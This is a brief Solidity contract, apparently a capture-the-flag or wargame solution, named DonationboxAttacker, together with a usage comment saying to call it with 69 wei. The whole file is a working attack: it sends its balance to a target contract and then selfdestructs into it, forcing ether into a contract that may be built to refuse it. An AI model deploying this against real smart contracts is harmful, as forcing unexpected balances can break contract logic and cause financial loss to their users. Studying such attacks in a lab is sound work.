pragma solidity ^0.4.6;


contract DonationboxAttacker {
  function transfer(address _target) payable public returns (bool){
    _target.send(thisbal());
    selfdestruct(_target);
    return true;
  }

  function thisbal() public view returns (uint256 balance) {
      return address(this).balance;
  }
}

//Call DonationboxAttacker.transfer("Contract Address") with 69 wei
